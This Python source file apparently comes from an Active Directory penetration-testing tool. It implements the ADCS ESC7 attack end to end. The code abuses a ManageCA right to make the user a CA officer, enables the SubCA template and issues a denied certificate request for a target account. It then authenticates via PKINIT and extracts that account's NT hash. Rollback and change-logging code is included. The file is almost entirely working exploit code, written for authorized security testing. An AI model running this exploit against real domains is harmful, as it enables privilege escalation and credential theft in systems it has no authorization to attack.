"""ESC7 — ManageCA: enable SubCA template, issue pending cert, then authenticate."""
from __future__ import annotations
import asyncio
from pathlib import Path
from typing import Optional
from adscan_internal.rich_output import print_info, print_success, print_error
from adscan_internal.services.adcs.cert_request import (
    CertRequestConfig, request_certificate_native, retrieve_certificate_native,
)
from adscan_internal.services.adcs.cert_auth import CertAuthConfig, authenticate_with_cert_native
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
from adscan_internal.services.adcs.esc_cleanup import (
    esc_rollback_scope, register_ldap_change, mark_reverted, mark_revert_failed,
)
from adscan_internal.services.ldap_transport_service import ADscanLDAPConnection, ADscanLDAPConfig
from adscan_internal.services.adcs.ca_admin import add_officer, remove_officer

_SUBCA_TEMPLATE = "SubCA"


def _ldap_cfg(config: EscConfig) -> ADscanLDAPConfig:
    return ADscanLDAPConfig(
        domain=config.auth_domain,
        dc_ip=config.dc_ip,
        use_ldaps=True,
        use_kerberos=False,
        username=config.username,
        password=config.effective_secret,
    )


def _find_ca_dn(conn: ADscanLDAPConnection, ca_name: str) -> Optional[str]:
    conn.search(
        search_base=f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{conn.config_dn}",
        search_filter=f"(cn={ca_name})",
        attributes=["distinguishedName"],
    )
    if not conn.entries:
        return None
    return str(conn.entries[0].dn)


def _output_dir(config: EscConfig) -> Path:
    d = Path(config.workspace_dir or "/tmp") / "adcs" / "esc7"
    d.mkdir(parents=True, exist_ok=True)
    return d


async def run_esc7(config: EscConfig) -> EscResult:
    """ESC7: ManageCA → add-officer → enable SubCA → request → issue → retrieve → PKINIT.

    Flow:
      1. Use ManageCA right to add self as officer (grants ManageCertificates).
      2. Enable SubCA certificate template on the CA via LDAP.
      3. Request a SubCA cert — the CA will deny it (policy module).
      4. Use ManageCertificates (officer) to issue the denied request via DCOM.
      5. Retrieve the issued cert.
      6. PKINIT → NT hash.
      7. Rollback: remove officer right + disable SubCA template.
    """
    out = _output_dir(config)
    cfg = _ldap_cfg(config)

    def _read_ca_state() -> tuple[Optional[str], list[str]]:
        with ADscanLDAPConnection(cfg) as conn:
            _ca_dn = _find_ca_dn(conn, config.ca_name)
            if not _ca_dn:
                return None, []
            conn.search(
                search_base=_ca_dn,
                search_filter="(objectClass=*)",
                attributes=["certificateTemplates"],
                search_scope="BASE",
            )
            _templates: list[str] = []
            if conn.entries:
                raw = conn.entries[0].entry_raw_attributes.get("certificateTemplates") or []
                _templates = [(v.decode() if isinstance(v, bytes) else str(v)) for v in raw]
            return _ca_dn, _templates

    ca_dn, current_templates = await asyncio.to_thread(_read_ca_state)
    if not ca_dn:
        return EscResult(success=False, esc=7, error=f"CA '{config.ca_name}' not found in LDAP")
    subca_was_enabled = _SUBCA_TEMPLATE in current_templates

    # The ca_template_enabled ledger change is registered ONLY when ADscan
    # actually enables the SubCA template (see the enable block below). SubCA is
    # enabled by default on a standard Enterprise CA, so registering it
    # unconditionally — then no-op'ing the revert — would leave the entry pending
    # and the session-death guarantee would finalize it as a FALSE
    # `manual_required`, telling the client to revert a change ADscan never made.
    change_id: Optional[str] = None
    # Single-fire guards: both reverts run on the success path AND are queued in
    # the rollback scope, so without a guard a post-revert raise (e.g. PKINIT)
    # would re-run them — double-deleting the template into a false revert_failed.
    subca_reverted = False
    officer_removed = False

    async with esc_rollback_scope() as rb:

        # Step 0: Add self as CA officer (grants ManageCertificates) — requires ManageCA.
        print_info(f"ESC7: adding {config.username!r} as officer on {config.ca_name}...")
        ok_officer, err_officer = await asyncio.to_thread(
            add_officer,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            dc_ip=config.dc_ip,
            domain=config.auth_domain,
            username=config.username,
            password=config.effective_secret or "",
            target_username=config.username,
        )
        if not ok_officer:
            return EscResult(
                success=False, esc=7,
                error=f"add-officer failed — ManageCA required: {err_officer}",
            )

        async def _remove_officer() -> None:
            nonlocal officer_removed
            if officer_removed:
                return
            officer_removed = True
            print_info(f"ESC7: removing {config.username!r} officer right from {config.ca_name}...")
            await asyncio.to_thread(
                remove_officer,
                ca_host=config.ca_host,
                ca_name=config.ca_name,
                dc_ip=config.dc_ip,
                domain=config.auth_domain,
                username=config.username,
                password=config.effective_secret or "",
                target_username=config.username,
            )

        rb.add(_remove_officer)

        async def _disable_subca() -> None:
            nonlocal subca_reverted
            # Nothing to undo unless ADscan enabled the template this run.
            # `change_id is None` covers both the pre-enabled case (no change,
            # no disclosure) and an enable that never registered.
            if subca_reverted or change_id is None:
                return
            subca_reverted = True
            print_info(f"ESC7: removing SubCA from {config.ca_name} templates...")

            def _do_disable() -> bool:
                with ADscanLDAPConnection(cfg) as c2:
                    return c2.modify(ca_dn, {"certificateTemplates": [("delete", [_SUBCA_TEMPLATE])]})

            ok = await asyncio.to_thread(_do_disable)
            if ok:
                mark_reverted(config.shell, change_id)
                print_success("ESC7: SubCA template removed.")
            else:
                mark_revert_failed(
                    config.shell, change_id, error="LDAP modify failed",
                    instructions=f"Manually remove SubCA from certificateTemplates on {ca_dn}",
                )
                print_error("ESC7: failed to remove SubCA (manual cleanup required).")

        rb.add(_disable_subca)

        # Enable SubCA if not already enabled — register the ledger change ONLY
        # here, immediately after a successful enable, so a change ADscan did not
        # make is never disclosed.
        if not subca_was_enabled:
            print_info(f"ESC7: enabling SubCA template on {config.ca_name}...")

            def _do_enable() -> bool:
                with ADscanLDAPConnection(cfg) as conn:
                    return conn.modify(ca_dn, {"certificateTemplates": [("add", [_SUBCA_TEMPLATE])]})

            ok = await asyncio.to_thread(_do_enable)
            if not ok:
                raise RuntimeError(f"Failed to add SubCA to certificateTemplates on {ca_dn}")

            change_id = register_ldap_change(
                config.shell, kind="ca_template_enabled",
                domain=config.domain, target=f"EnterpriseCA/{config.ca_name}",
                detail={"ca_dn": ca_dn, "template": _SUBCA_TEMPLATE, "was_enabled": False},
                method="ADCSESC7 — SubCA template enable",
            )

        # Request SubCA cert (likely PENDING)
        print_info(f"ESC7: requesting SubCA certificate as {config.target_upn}...")
        _esc7_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain, kdc_ip=config.auth_kdc,
            ca_host=config.ca_host, ca_name=config.ca_name,
            template=_SUBCA_TEMPLATE, username=config.username,
            password=config.effective_secret, upn=config.target_upn,
            ca_fqdn=config.ca_fqdn,
            **({} if _esc7_key_size is None else {"key_size": int(_esc7_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)

        # disposition 3 = issued, 5 = pending, 2/4 = denied, None = aiosmb denied
        # If we got a request_id, proceed to issue it via ManageCertificates
        request_id = req.request_id
        if not req.success and not request_id:
            raise RuntimeError(f"SubCA cert request failed (no request ID): {req.error}")

        if req.success and req.pfx_path:
            # Issued immediately — skip issue+retrieve
            issued_pfx = req.pfx_path
            issued_pw = req.pfx_password or ""
        else:
            # Use ManageCertificates right to issue the pending/denied request
            from adscan_internal.services.adcs.ca_admin import issue_pending_request
            ok, err = await asyncio.to_thread(
                issue_pending_request,
                ca_host=config.ca_host,
                ca_name=config.ca_name,
                request_id=request_id,
                username=config.username,
                password=config.effective_secret or "",
                domain=config.auth_domain,
            )
            if not ok:
                raise RuntimeError(f"Failed to issue pending request {request_id}: {err}")

            # Retrieve the now-issued cert. Carry the ORIGINAL request's private
            # key forward so the issued PFX is signing-capable — the CA only
            # returns the cert, the key lives only in the denied request result.
            print_info(f"ESC7: retrieving issued cert for request ID {request_id}...")
            ret = await retrieve_certificate_native(
                req_cfg, out, request_id=request_id,
                private_key_pem=req.private_key_pem,
            )
            if not ret.success:
                raise RuntimeError(f"Certificate retrieval failed: {ret.error}")
            issued_pfx = ret.pfx_path
            issued_pw = ret.pfx_password or ""

        # Rollback: disable SubCA and remove officer right
        await _disable_subca()
        await _remove_officer()

        # PKINIT
        auth_cfg = CertAuthConfig(
            domain=config.domain, kdc_ip=config.dc_ip,
            pfx_path=issued_pfx, pfx_password=issued_pw,
            username=config.target_upn.split("@")[0] if config.target_upn else None,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            return EscResult(success=False, esc=7, error=auth.error or "PKINIT failed")

        print_success(f"ESC7: NT hash obtained — {auth.nt_hash}")
        return EscResult(
            success=True, esc=7, nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(issued_pfx),
        )
